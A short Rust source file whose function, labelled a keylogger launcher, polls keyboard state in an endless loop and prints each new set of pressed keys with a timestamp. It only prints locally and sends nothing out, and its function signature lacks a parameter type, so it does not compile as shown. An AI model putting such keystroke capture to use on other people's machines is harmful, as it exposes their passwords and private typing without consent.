use chrono::prelude::*;
use device_query::{DeviceQuery, DeviceState};

/// Keylogger launch function
pub fn run(app) {
    let device_state = DeviceState::new();

    let mut prev_keys = vec![];

    loop {
        let local: DateTime<Local> = Local::now();

        let keys = device_state.get_keys();
        if keys != prev_keys && !keys.is_empty() {
            println!("[{:?}] [Keyboard] {:?}", local, keys);
        }
        prev_keys = keys;
    }
}
